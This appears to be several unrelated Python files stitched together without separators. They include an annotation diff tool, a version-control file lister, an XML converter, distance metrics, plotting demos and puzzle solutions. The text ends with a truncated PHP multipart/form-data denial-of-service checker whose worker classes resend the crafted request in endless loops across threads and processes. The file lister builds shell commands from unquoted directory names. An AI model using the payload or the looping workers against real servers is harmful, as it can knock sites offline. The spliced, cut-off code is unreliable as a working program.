p.map(extract_feature, load)
print root
p.close()
if __name__=="__main__":
extract(orl_path, orl_dst_path, True)
from __future__ import with_statement
try:
import annotation
except ImportError:
import os.path
from sys import path as sys_path
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/src'))
import annotation
try:
import argparse
except ImportError:
import os.path
from sys import path as sys_path
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/lib'))
import argparse
sys_path.append(os.path.join(os.path.dirname(__file__), '..'))
class Mapping:
def __init__(self):
self.first_by_second = dict()
self.second_by_first = dict()
self.only_in_second = []
def add(self, first, second, is_clone=False):
self.first_by_second[second] = first
self.second_by_first[first] = second
if is_clone:
self.only_in_second.append(second)
def get_second(self, first):
return self.second_by_first[first] if first in self.second_by_first else None
def get_first(self, second):
return self.first_by_second[second] if second in self.first_by_second else None
def is_only_in_second(self, second):
return second in self.only_in_second
def is_only_in_first(self, first):
return first in self.second_by_first
class AnnotationDiff:
def __init__(self, first, second, result):
self.first = first
self.second = second
self.result = result
self.mapping = Mapping()
self.first_textbounds = dict((textbound.id, textbound) for textbound in first.get_textbounds())
def diff(self):
self.diff_entities()
self.diff_triggers()
self.diff_events()
self.diff_oneline_comments()
self.diff_equivs()
self.diff_normalizations()
self.diff_attributes()
self.diff_relations()
def add_mark(self, type, target, reason):
comment = annotation.OnelineCommentAnnotation(
target,
self.result.get_new_id('#'),
type,
"\t" + reason)
self.result.add_annotation(comment)
def add_missing(self, target, reason):
self.add_mark('MissingAnnotation', target, reason)
def add_added(self, target, reason):
self.add_mark('AddedAnnotation', target, reason)
def add_changed(self, target, reason):
self.add_mark('ChangedAnnotation', target, reason)
def find_entity(self, haystack, needle):
for entity in haystack.get_entities():
if entity.same_span(needle) and entity.type == needle.type:
return entity
return None
def diff_entities(self):
found_first_ids = set()
for entity in self.second.get_entities():
found_first = self.find_entity(self.first, entity)
if found_first is None:
self.add_added(entity.id, 'Added entity')
else:
found_first_ids.add(found_first.id)
self.mapping.add(found_first.id, entity.id)
import copy
for entity in self.first.get_entities():
if not entity.id in found_first_ids:
clone = copy.copy(entity)
clone.id = self.result.get_new_id('T')
self.result.add_annotation(clone)
self.mapping.add(entity.id, clone.id, True)
self.add_missing(clone.id, 'Missing entity')
def find_trigger(self, haystack, needle):
for trigger in haystack.get_triggers():
if trigger.same_span(needle) and trigger.type == needle.type:
return trigger
return None
def diff_triggers(self):
found_first_ids = set()
for trigger in self.second.get_triggers():
found_first = self.find_trigger(self.first, trigger)
if found_first:
found_first_ids.add(found_first.id)
self.mapping.add(found_first.id, trigger.id)
import copy
for trigger in self.first.get_triggers():
if not trigger.id in found_first_ids:
clone = copy.copy(trigger)
clone.id = self.result.get_new_id('T')
self.result.add_annotation(clone)
self.mapping.add(trigger.id, clone.id, True)
def trigger_or_self(self, target, triggers):
try:
return triggers[target]
except KeyError:
return target
def find_closest_events(self, second_event, found_events_dict, first_triggers, second_triggers):
second_args = dict((role, self.trigger_or_self(target, second_triggers)) for (role, target) in second_event.args)
second_roles = set(second_args.keys())
for first_event in self.first.get_events():
if self.mapping.get_second(first_event.trigger) == second_event.trigger and first_event.type == second_event.type:
first_args = dict((role, self.mapping.get_second(self.trigger_or_self(target, first_triggers))) for (role, target) in first_event.args)
first_roles = set(first_args.keys())
only_first = set(role for role in first_roles if first_args.get(role) != second_args.get(role))
only_second = set(role for role in second_roles if first_args.get(role) != second_args.get(role))
match = (first_event.id, first_args, second_args, only_first, only_second)
score = len(only_first) + len(only_second)
try:
found_events_dict[score]
except KeyError:
found_events_dict[score] = dict()
try:
found_events_dict[score][second_event.id]
except KeyError:
found_events_dict[score][second_event.id] = []
found_events_dict[score][second_event.id].append(match)
def diff_events(self):
second_triggers = dict((event.id, event.trigger) for event in self.second.get_events())
first_triggers = dict((event.id, event.trigger) for event in self.first.get_events())
found_first_ids = set()
found_second_ids = set()
found_events_dict = dict()
for event in self.second.get_events():
self.find_closest_events(event, found_events_dict, first_triggers, second_triggers)
for score in sorted(found_events_dict.keys()):
for second_event_id in found_events_dict[score]:
if not second_event_id in found_second_ids:
for match in found_events_dict[score][second_event_id]:
first_event_id, first_args, second_args, only_first, only_second = match
if not first_event_id in found_first_ids:
found_first_ids.add(first_event_id)
found_second_ids.add(second_event_id)
self.mapping.add(first_event_id, second_event_id)
for role in only_first:
first_text = self.first_textbounds[self.mapping.get_first(first_args[role])].get_text()
if role in only_second:
self.add_changed(second_event_id, 'Changed role %s (from %s "%s")' % (role, first_args[role], first_text))
else:
self.add_changed(second_event_id, 'Missing role %s (%s "%s")' % (role, first_args[role], first_text))
for role in only_second - only_first:
self.add_changed(second_event_id, 'Added role %s' % role)
for event in self.second.get_events():
if not event.id in found_second_ids:
self.add_added(event.id, 'Added event')
for event in self.first.get_events():
if not event.id in found_first_ids:
import copy
clone = copy.copy(event)
clone.id = self.result.get_new_id('E')
clone.trigger = self.mapping.get_second(event.trigger)
clone.args = [(role, self.mapping.get_second(trigger)) for (role, trigger) in clone.args]
self.result.add_annotation(clone)
self.mapping.add(event.id, clone.id, True)
self.add_missing(clone.id, 'Missing event')
def find_attribute(self, haystack, needle, target):
for attribute in haystack.get_attributes():
if attribute.target == target and attribute.type == needle.type:
return attribute
return None
def has_attribute(self, haystack, needle, target):
return (self.find_attribute(haystack, needle, target) is not None)
def diff_attributes(self):
for attribute in self.second.get_attributes():
target_in_first = self.mapping.get_first(attribute.target)
found_first = self.find_attribute(self.first, attribute, target_in_first)
if found_first is None:
if target_in_first:
self.add_changed(attribute.target, 'Added attribute %s' % attribute.type)
elif found_first.value != attribute.value:
self.add_changed(attribute.target, 'Changed attribute %s (from %s)' % (attribute.type, found_first.value))
for attribute in self.first.get_attributes():
target_in_second = self.mapping.get_second(attribute.target)
if self.mapping.is_only_in_first(attribute.target):
import copy
clone = copy.copy(attribute)
clone.id = self.result.get_new_id('A')
clone.target = target_in_second
self.result.add_annotation(clone)
else:
if not self.has_attribute(self.second, attribute, target_in_second) and target_in_second:
self.add_changed(attribute.target, 'Missing attribute %s (%s)' % (attribute.type, attribute.value))
def has_oneline_comment(self, haystack, needle, target):
for oneline_comment in haystack.get_oneline_comments():
if oneline_comment.target == target and oneline_comment.get_text() == needle.get_text():
return True
return False
def diff_oneline_comments(self):
for oneline_comment in self.second.get_oneline_comments():
target_in_first = self.mapping.get_first(oneline_comment.target)
if not self.has_oneline_comment(self.first, oneline_comment, target_in_first):
self.add_changed(oneline_comment.target, 'Added %s: "%s"' % (oneline_comment.type, oneline_comment.get_text()))
for oneline_comment in self.first.get_oneline_comments():
target_in_second = self.mapping.get_second(oneline_comment.target)
if not self.has_oneline_comment(self.second, oneline_comment, target_in_second):
self.add_changed(target_in_second, 'Missing %s: "%s"' % (oneline_comment.type, oneline_comment.get_text()))
def diff_equivs(self):
correspondence_map = dict()
second_equivs = [equiv.entities for equiv in self.second.get_equivs()]
for equiv_group, equiv in enumerate(second_equivs):
for entity in equiv:
correspondence_map[entity] = [None, equiv_group]
first_equivs = [equiv.entities for equiv in self.first.get_equivs()]
for equiv_group, equiv in enumerate(first_equivs):
for first_entity in equiv:
entity = self.mapping.get_second(first_entity)
if entity in correspondence_map:
correspondence_map[entity][0] = equiv_group
else:
correspondence_map[entity] = [equiv_group, None]
correspondence_hist = dict()
for entity in correspondence_map.keys():
key = "%s-%s" % tuple(correspondence_map[entity])
if key not in correspondence_hist:
correspondence_hist[key] = [1, correspondence_map[entity], [entity]]
else:
correspondence_hist[key][0] += 1
correspondence_hist[key][2].append(entity)
seen = []
import operator
sorted_hist = sorted(correspondence_hist.iteritems(), key=operator.itemgetter(1))
for key, equiv_item in sorted_hist:
count, correspondence_pair, entities = equiv_item
first_group, second_group = correspondence_pair
for entity in entities:
if first_group is None:
self.add_changed(entity, 'Added to equiv')
elif second_group is None:
rest = ["%s (%s)" % (self.mapping.get_second(other), self.first_textbounds[other].get_text()) for other in first_equivs[first_group] if other != entity]
self.add_changed(entity, 'Missing from equiv with %s' % ', '.join(rest))
elif entity in seen:
rest = ["%s (%s)" % (self.mapping.get_second(other), self.first_textbounds[other].get_text()) for other in first_equivs[first_group] if other != entity]
self.add_changed(entity, 'Changed from equiv %s' % ', '.join(rest))
else:
seen.append(entity)
def diff_relations(self):
first_relations = dict(((self.mapping.get_second(relation.arg1), self.mapping.get_second(relation.arg2), relation.type), relation.id) for relation in self.first.get_relations())
second_relations = dict(((relation.arg1, relation.arg2, relation.type), relation.id) for relation in self.second.get_relations())
first_relations_set = set(first_relations)
second_relations_set = set(second_relations)
for relation in second_relations_set - first_relations_set:
source, target, relation_type = relation
self.add_changed(source, 'Added relation %s to %s' % (relation_type, target))
for relation in first_relations_set - second_relations_set:
source, target, relation_type = relation
first_text = self.first_textbounds[self.mapping.get_first(target)].get_text()
self.add_changed(source, 'Missing relation %s to %s "%s"' % (relation_type, target, first_text))
def has_normalization(self, haystack, needle, target):
for normalization in haystack.get_normalizations():
if normalization.target == target and normalization.refdb == needle.refdb and normalization.refid == needle.refid:
return True
return False
def diff_normalizations(self):
for normalization in self.second.get_normalizations():
target_in_first = self.mapping.get_first(normalization.target)
if not self.has_normalization(self.first, normalization, target_in_first):
self.add_changed(normalization.target, 'Added normalization %s:%s "%s"' % (normalization.refdb, normalization.refid, normalization.reftext))
for normalization in self.first.get_normalizations():
target_in_second = self.mapping.get_second(normalization.target)
if not self.has_normalization(self.second, normalization, target_in_second):
self.add_changed(target_in_second, 'Missing normalization %s:%s "%s"' % (normalization.refdb, normalization.refid, normalization.reftext))
KNOWN_FILE_SUFF = [annotation.TEXT_FILE_SUFFIX] + annotation.KNOWN_FILE_SUFF
EXTENSIONS_RE = '\\.(%s)$' % '|'.join(KNOWN_FILE_SUFF)
def name_without_extension(file_name):
import re
return re.sub(EXTENSIONS_RE, '', file_name)
def copy_annotations(original_name, new_name):
import shutil
for extension in KNOWN_FILE_SUFF:
try:
shutil.copyfile('%s.%s' % (original_name, extension), '%s.%s' % (new_name, extension))
except IOError, e:
pass
return annotation.TextAnnotations(new_name)
def delete_annotations(name):
bare_name = name_without_extension(name)
for extension in KNOWN_FILE_SUFF:
try:
os.remove('%s.%s' % (name, extension))
except OSError, e:
pass
def diff_files(first_name, second_name, result_name):
first_bare = name_without_extension(first_name)
second_bare = name_without_extension(second_name)
result_bare = name_without_extension(result_name)
first = annotation.TextAnnotations(first_bare)
second = annotation.TextAnnotations(second_bare)
result = copy_annotations(second_bare, result_bare)
with result:
AnnotationDiff(first, second, result).diff()
def is_dir(name):
import os.path
if os.path.exists(name):
return os.path.isdir(name)
else:
bare_name = name_without_extension(name)
for ext in annotation.KNOWN_FILE_SUFF:
if os.path.isfile('%s.%s' % (bare_name, ext)):
return False
return None
def add_files(files, dir_or_file, errors):
import glob
import re
is_a_dir = is_dir(dir_or_file)
if is_a_dir is None:
errors.append('Error: no annotation files found in %s' % dir_or_file)
elif not is_a_dir:
files.append(dir_or_file)
else:
subfiles = glob.glob(os.path.join(dir_or_file, '*'))
matching_subfiles = [subfile for subfile in subfiles if re.search(EXTENSIONS_RE, subfile)]
bare_subfiles = set([name_without_extension(subfile) for subfile in matching_subfiles])
found = False
for subfile in bare_subfiles:
if is_dir(subfile) == False:
files.append(subfile)
found = True
if not found:
errors.append('Error: no annotation files found in %s' % dir_or_file)
def diff_files_and_dirs(firsts, second, result, force=False, verbose=False):
import os.path
errors = []
fatal_errors = []
second_dir = is_dir(second)
result_dir = is_dir(result)
single_first = len(firsts) == 1 and is_dir(firsts[0]) == False
first_files = []
for first in firsts:
add_files(first_files, first, errors)
if first_files == []:
fatal_errors.append('Error: no annotation files found in %s' % ', '.join(firsts))
if second_dir is None:
fatal_errors.append('Error: no annotation files found in %s' % second)
if not single_first and len(first_files) > 1 and result_dir is False:
fatal_errors.append('Error: result of comparison of multiple files doesn\'t fit in %s' % result)
errors.extend(fatal_errors)
if fatal_errors == []:
if not single_first and second_dir and result_dir is None:
os.mkdir(result)
result_dir = True
for first_name in first_files:
basename = os.path.basename(first_name)
if verbose:
print "Comparing", basename
if second_dir:
second_name = os.path.join(second, basename)
if is_dir(second_name) != False:
errors.append('Error: No annotation files found corresponding to %s' % second_name)
continue
else:
second_name = second
result_name = os.path.join(result, basename) if result_dir else result
real_result_dir = is_dir(result_name)
if real_result_dir == True:
errors.append('Error: %s is a directory' % result_name)
continue
if real_result_dir == False:
if force:
delete_annotations(result_name)
else:
errors.append('Error: %s already exists (use --force to overwrite)' % result_name)
continue
diff_files(first_name, second_name, result_name)
if errors != []:
sys.stderr.write("\n".join(errors) + "\n")
exit(1)
def argparser():
import argparse
ap=argparse.ArgumentParser(description="Diff two annotation files, creating a diff annotation file")
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output.")
ap.add_argument("firsts", metavar="<first>", nargs="+", help="Original (or gold standard) directories/files")
ap.add_argument("second", metavar="<second>", help="Changed (or tested) directory/file")
ap.add_argument("result", metavar="<result>", help="Output file/directory")
ap.add_argument("-f", "--force", action="store_true", help="Force overwrite")
return ap
def main(argv=None):
if argv is None:
argv = sys.argv
args = argparser().parse_args(argv[1:])
diff_files_and_dirs(args.firsts, args.second, args.result, args.force, args.verbose)
if __name__ == "__main__":
import sys
sys.exit(main(sys.argv))
import os
import subprocess
import sys
class CVSHandler():
def __init__(self, cvs):
self._roots_cache = {}
self._not_tracked_cache = set()
self.cvs = cvs
def _get_root_from_cache(self, directory):
if directory in self._roots_cache:
return directory
if os.path.dirname(directory) == directory:
return None
return self._get_root_from_cache(os.path.dirname(directory))
def get_source_files(self, directory):
if directory in self._not_tracked_cache:
return None
root_dir = self._get_root_from_cache(directory)
if not root_dir:
try:
root_dir = self.cvs._get_root(directory)
self._roots_cache[root_dir] = self.cvs._get_tracked_files(root_dir)
except Exception as e:
self._not_tracked_cache.add(directory)
return None
files = self._roots_cache[root_dir]
if directory != root_dir:
rel_dir = os.path.relpath(directory, root_dir)
files = [f[len(rel_dir)+1:] for f in files if f.startswith(rel_dir)]
return files
class Git():
@staticmethod
def _get_root(directory):
return run_command("cd %s && git rev-parse --show-toplevel" % directory).strip()
@staticmethod
def _get_tracked_files(directory):
return run_command("cd %s && git ls-files && git ls-files --others --exclude-standard" % directory).strip().split('\n')
class Mercurial():
@staticmethod
def _get_root(directory):
return run_command("cd %s && hg root" % directory).strip()
@staticmethod
def _get_tracked_files(directory):
return run_command("cd %s && (hg status -marcu | cut -d' ' -f2)" % directory).strip().split('\n')
class DefaultDirHandler():
def __init__(self):
self._cache = {}
self.MAX_DEPTH = 3
def _walk_down(self, start_dir):
try:
out = run_command("find %s -maxdepth %s -type f -not -path '*/\.*'" % (start_dir, self.MAX_DEPTH))
except subprocess.CalledProcessError as e:
out = e.output
if sys.version_info >= (3, 0):
out = out.decode('utf-8')
if not out:
return []
files = out.split('\n')
return [os.path.relpath(f, start_dir) for f in files if f]
def get_source_files(self, start_dir):
if not start_dir in self._cache:
self._cache[start_dir] = self._walk_down(start_dir)
return self._cache[start_dir]
def run_command(string):
DEVNULL = open(os.devnull, 'wb')
out = subprocess.check_output(string, stderr=DEVNULL, shell=True)
if sys.version_info >= (3, 0):
return out.decode('utf-8')
return out
git = CVSHandler(Git)
hg = CVSHandler(Mercurial)
default = DefaultDirHandler()
def get_source_files(directory):
files = git.get_source_files(directory)
if files:
return files
files = hg.get_source_files(directory)
if files:
return files
return default.get_source_files(directory)
import sys
import re
try:
import cElementTree as ET
except:
import xml.etree.cElementTree as ET
EXCLUDED_TAGS = [
"PAPER",
"s",
]
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }
ELIDED_TEXT_STRING = "[[[...]]]"
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000
def c_escape(s):
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')
def strip_ns(tag):
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)
class Standoff:
def __init__(self, sid, element, start, end, text):
self.sid     = sid
self.element = element
self.start   = start
self.end     = end
self.text    = text
def strip(self):
while self.start < self.end and self.text[0].isspace():
self.start += 1
self.text = self.text[1:]
while self.start < self.end and self.text[-1].isspace():
self.end -= 1
self.text = self.text[:-1]
def compress_text(self, l):
if len(self.text) >= l:
el = len(ELIDED_TEXT_STRING)
sl = (l-el)/2
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])
def tag(self):
return strip_ns(self.element.tag)
def attrib(self):
attrib = {}
for a in self.element.attrib:
if a[0] == "{":
an = re.sub(r'\{.*?\}', '', a)
else:
an = a
attrib[an] = self.element.attrib[a]
return attrib
def __str__(self):
return "X%d\t%s %d %d\t%s\t%s" % \
(self.sid, self.tag(), self.start, self.end,
c_escape(self.text.encode("utf-8")),
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))
for k,v in self.attrib().items()]))
def txt(s):
return s if s is not None else ""
next_free_so_id = 1
def text_and_standoffs(e, curroff=0, standoffs=None):
global next_free_so_id
if standoffs == None:
standoffs = []
startoff = curroff
so = Standoff(next_free_so_id, e, 0, 0, "")
next_free_so_id += 1
standoffs.append(so)
setext, _ = subelem_text_and_standoffs(e, curroff+len(txt(e.text)),
standoffs)
text = txt(e.text) + setext
curroff += len(text)
so.start = startoff
so.end   = curroff
so.text  = text
return (text, standoffs)
def subelem_text_and_standoffs(e, curroff, standoffs):
startoff = curroff
text = ""
for s in e:
stext, dummy = text_and_standoffs(s, curroff, standoffs)
text += stext
text += txt(s.tail)
curroff = startoff + len(text)
return (text, standoffs)
NORM_SPACE_REGEX = re.compile(r'\s+')
def normalize_space(e, tags=None):
if strip_ns(e.tag) == 'PAPER':
assert e.text == '' or e.text.isspace()
e.text = ''
if tags is None or strip_ns(e.tag) in tags:
if e.text is not None:
n = NORM_SPACE_REGEX.sub(' ', e.text)
e.text = n
if e.tail is not None:
n = NORM_SPACE_REGEX.sub(' ', e.tail)
e.tail = n
for c in e:
normalize_space(c)
def add_newlines(e):
if (strip_ns(e.tag) == 'segment' and
e.attrib.get('segtype').strip() == 'Header'):
assert e.tail == '' or e.tail.isspace(), 'unexpected content in tail'
e.text = '\n' + (e.text if e.text is not None else '')
e.tail = '\n'
for c in e:
add_newlines(c)
def generate_id(prefix):
if prefix not in generate_id._next:
generate_id._next[prefix] = 1
id_ = prefix+str(generate_id._next[prefix])
generate_id._next[prefix] += 1
return id_
generate_id._next = {}
def convert_segment(s):
sostrings = []
if s.start == s.end:
return []
tid = generate_id('T')
sostrings.append('%s\t%s %d %d\t%s' % \
(tid, s.attrib()['segtype'].strip(), s.start, s.end,
s.text.encode('utf-8')))
return sostrings
convert_function = {
"segment" : convert_segment,
}
def main(argv=[]):
if len(argv) != 4:
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"
return -1
in_fn, out_txt_fn, out_so_fn = argv[1:]
if in_fn == "-":
in_fn = "/dev/stdin"
if out_txt_fn == "-":
out_txt_fn = "/dev/stdout"
if out_so_fn == "-":
out_so_fn = "/dev/stdout"
tree = ET.parse(in_fn)
root = tree.getroot()
normalize_space(root, ['segment'])
add_newlines(root)
text, standoffs = text_and_standoffs(root)
for s in standoffs:
s.strip()
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]
converted = []
for s in standoffs:
if s.tag() in convert_function:
converted.extend(convert_function[s.tag()](s))
else:
converted.append(s)
standoffs = converted
for so in standoffs:
try:
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)
except AttributeError:
pass
out_txt = open(out_txt_fn, "wt")
out_so  = open(out_so_fn, "wt")
out_txt.write(text.encode("utf-8"))
for so in standoffs:
print >> out_so, so
out_txt.close()
out_so.close()
if __name__ == "__main__":
sys.exit(main(sys.argv))
import numpy as np
from facerec_py.facerec import normalization
class AbstractDistance(object):
def __init__(self, name):
self._name = name
def __call__(self,p,q):
raise NotImplementedError("Every AbstractDistance must implement the __call__ method.")
@property
def name(self):
return self._name
def __repr__(self):
return self._name
class EuclideanDistance(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "EuclideanDistance")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
return np.sqrt(np.sum(np.power(p-q, 2)))
class CosineDistance(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "CosineDistance")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
return -np.dot(p.T,q) / (np.sqrt(np.dot(p,p.T)*np.dot(q,q.T)))
class NormalizedCorrelation(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "NormalizedCorrelation")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
pmu = p.mean()
qmu = q.mean()
pm = p - pmu
qm = q - qmu
return 1.0 - (np.dot(pm, qm) / (np.sqrt(np.dot(pm, pm)) * np.sqrt(np.dot(qm, qm))))
class ChiSquareDistance(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "ChiSquareDistance")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
bin_dists = (p-q)**2 / (p+q+np.finfo('float').eps)
return np.sum(bin_dists)
class HistogramIntersection(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "HistogramIntersection")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
sim = np.sum(np.minimum(p, q))
return 1/(sim+1)
class HistogramNormalizationIntersection(AbstractDistance):
def __init__(self):
super(self.__class__, self).__init__("HistogramNormalizationIntersection")
self.hist_int = HistogramIntersection()
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
p = normalization.vector_normalize(p)
q = normalization.vector_normalize(q)
return self.hist_int(p, q)
class BinRatioDistance(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "BinRatioDistance")
def __call__(self, p, q):
p = np.asarray(p).flatten()
q = np.asarray(q).flatten()
a = np.abs(1-np.dot(p,q.T))
b = ((p-q)**2 + 2*a*(p*q))/((p+q)**2+np.finfo('float').eps)
return np.abs(np.sum(b))
class L1BinRatioDistance(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "L1-BinRatioDistance")
def __call__(self, p, q):
p = np.asarray(p, dtype=np.float).flatten()
q = np.asarray(q, dtype=np.float).flatten()
a = np.abs(1-np.dot(p,q.T))
b = ((p-q)**2 + 2*a*(p*q)) * abs(p-q) / ((p+q)**2+np.finfo('float').eps)
return np.abs(np.sum(b))
class ChiSquareBRD(AbstractDistance):
def __init__(self):
AbstractDistance.__init__(self, "ChiSquare-BinRatioDistance")
def __call__(self, p, q):
p = np.asarray(p, dtype=np.float).flatten()
q = np.asarray(q, dtype=np.float).flatten()
a = np.abs(1-np.dot(p,q.T))
b = ((p-q)**2 + 2*a*(p*q)) * (p-q)**2 / ((p+q)**3+np.finfo('float').eps)
return np.abs(np.sum(b))
from matplotlib import cm
from matplotlib.delaunay.testfuncs import gauss
from matplotlib.mlab import griddata
import numpy as np
import matplotlib.pyplot as plt
import scipy.interpolate
from scipy.stats import uniform
from matplotlib.mlab import bivariate_normal
from mpl_toolkits.mplot3d import Axes3D
def draw_contour():
x, y, z = 10*np.random.random((3, 10))
xi, yi = np.linspace(x.min(), x.max(), 100), np.linspace(y.min(), y.max(), 100)
xi, yi = np.meshgrid(xi, yi)
rbf = scipy.interpolate.Rbf(x, y, z, function='linear')
zi = rbf(xi, yi)
plt.imshow(zi, vmin=z.min(), vmax=z.max(), origin='lower',
extent=[x.min(), x.max(), y.min(), y.max()])
plt.show()
def plot_countour(x, y, z):
xi = np.linspace(-2.1, 2.1, 100)
yi = np.linspace(-2.1, 2.1, 100)
zi = griddata((x, y), z, (xi[None, :], yi[:, None]), method='cubic')
levels = [0.2, 0.4, 0.6, 0.8, 1.0]
CS = plt.contour(xi, yi, zi, len(levels), linewidths=0.5, colors='k', levels=levels)
CS = plt.contourf(xi, yi, zi, len(levels), cmap=cm.Greys_r, levels=levels)
plt.colorbar()
plt.xlim(-2, 2)
plt.ylim(-2, 2)
plt.title('griddata test')
plt.show()
def draw_2d_gaussian(mean=[0, 0], cov=[[1, 0], [0, 1]]):
x_2Dgauss = np.random.multivariate_normal(mean, cov, 10000)
f, ax = plt.subplots(figsize=(7, 7))
ax.scatter(x_2Dgauss[:, 0], x_2Dgauss[:, 1],
marker='o', color='green', s=4, alpha=0.3)
plt.title('10000 samples randomly drawn from a 2D Gaussian distribution')
plt.ylabel('x2')
plt.xlabel('x1')
ftext = 'p(x) ~ N(mu=(0,0)^t, cov=I)'
plt.figtext(.15, .85, ftext, fontsize=11, ha='left')
plt.ylim([-4, 4])
plt.xlim([-4, 4])
plt.show()
def draw_bivariate_3d(mean=[0, 0], cov=[[1, 0], [0, 1]]):
from matplotlib.mlab import bivariate_normal
fig = plt.figure()
ax = fig.gca(projection='3d')
x = np.linspace(-3, 3, 30)
y = x
X, Y = np.meshgrid(x, y)
Z = bivariate_normal(X, Y, mux=mean[0], muy=mean[1], sigmax=cov[0][0], sigmay=cov[1][1], sigmaxy=cov[0][1])
surf = ax.plot_surface(X, Y, Z, rstride=1,
cstride=1, cmap=plt.cm.coolwarm,
linewidth=0, antialiased=False
)
ax.set_zlim(0, 0.2)
ax.zaxis.set_major_locator(plt.LinearLocator(10))
ax.zaxis.set_major_formatter(plt.FormatStrFormatter('%.02f'))
ax.set_xlabel('X')
ax.set_ylabel('Y')
ax.set_zlabel('p(x)')
plt.title('Bivariate Gaussian distribution')
fig.colorbar(surf, shrink=0.5, aspect=7, cmap=plt.cm.coolwarm)
plt.show()
if __name__=="__main__":
draw_bivariate_3d()
class Solution:
def divide(self, dividend, divisor):
q = 0
if dividend == 0 or divisor == 0:
return 0
MAXINT = 2147483647
MININT = -2147483648
if dividend == MININT and divisor == -1:
return MAXINT
sign = 1 if dividend*divisor > 0 else -1
dividend, divisor = abs(dividend), abs(divisor)
d = divisor
q_cur = 1
if divisor > dividend:
return 0
while d<<1 < dividend:
d <<= 1
q_cur <<= 1
q += q_cur
dividend -= d
while dividend:
if divisor > dividend:
break
while d > dividend:
d >>= 1
q_cur >>= 1
q += q_cur
dividend -= d
return q*sign
if __name__ == "__main__":
print Solution().divide(-1, 1)
import sys, os, django
home = os.path.expanduser("~")
sys.path.append(os.path.join(home, 'path/to/projectroot'))
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "settings.active")
django.setup()
MOD = 10 ** 9 + 9
class Solution(object):
def __init__(self):
self.factorials = [0 for _ in xrange(26 + 1)]
self.factorials[0] = 1
for i in xrange(1, 26 + 1):
self.factorials[i] = self.factorials[i - 1] * i
N = 10 ** 5
K = 26
self.F = [[0 for _ in xrange(K + 1)] for _ in xrange(N + 1)]
for j in xrange(1, K + 1):
self.F[1][j] = j
for i in xrange(2, N + 1):
if i & 1 == 0:
self.F[i][j] = (self.F[i - 1][j] * j - self.F[i / 2][j])
else:
self.F[i][j] = (self.F[i - 1][j] * j)
self.F[i][j] %= MOD
self.G = [[0 for _ in xrange(K + 1)] for _ in xrange(N + 1)]
for j in xrange(1, K + 1):
total = j
for i in xrange(1, N + 1):
self.G[i][j] = total - self.F[i][j]
self.G[i][j] %= MOD
total *= j
total %= MOD
def solve(self, cipher):
N, K = cipher
P = 0
if K == 1:
P += self.G[N][K]
else:
for j in xrange(K, 0, -1):
P += (-1) ** (K - j) * self.G[N][j] * (
self.factorials[K] / (self.factorials[j] * self.factorials[K - j]))
P %= MOD
result = P * (self.factorials[26] / (self.factorials[K] * self.factorials[26 - K]))
return result % MOD
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
solution = Solution()
for t in xrange(testcases):
cipher = map(lambda x: int(x), f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
import sys
import urllib, urllib2
import datetime
from threading import Thread
from multiprocessing import Process
from optparse import OptionParser
import random
import string
def http_proxy(proxy_url):
proxy_handler = urllib2.ProxyHandler({"http": proxy_url})
null_proxy_handler = urllib2.ProxyHandler({})
opener = urllib2.build_opener(proxy_handler)
urllib2.install_opener(opener)
def check_php_multipartform_dos(url, post_body, headers):
req = urllib2.Request(url)
for key in headers.keys():
req.add_header(key, headers[key])
starttime = datetime.datetime.now();
try:
fd = urllib2.urlopen(req, post_body)
except urllib2.HTTPError, e:
print e
endtime = datetime.datetime.now()
usetime = (endtime - starttime).seconds
if usetime > 5:
result = url + " is vulnerable"
else:
if usetime > 3:
result = "need to check normal respond time"
else:
result = "normal"
return [result, usetime]
def main(options, args):
if options.target:
target = options.target
else:
return
num = options.lines
headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
'Accept-Encoding': 'gzip, deflate',
'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
ch = random.choice(string.ascii_lowercase)
payload = "\n".join(ch * num)
body += payload
body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
print "Starting..."
respond = check_php_multipartform_dos(target, body, headers)
print "Result: ",
print respond[0]
print "Respond time: " + str(respond[1]) + " seconds"
class WorkerMixin():
def __init__(self, options, args):
self.options = options
self.args = args
def run(self):
while True:
main(self.options, self.args)
class WorkerThread(WorkerMixin, Thread):
def __init__(self, options, args):
WorkerMixin.__init__(self, options, args)
Thread.__init__(self)
class WorkerProcess(WorkerMixin, Process):
def __init__(self, options, args):
WorkerMixin.__init__(self, options, args)
Process.__init__(self)
if __name__ == "__main__":
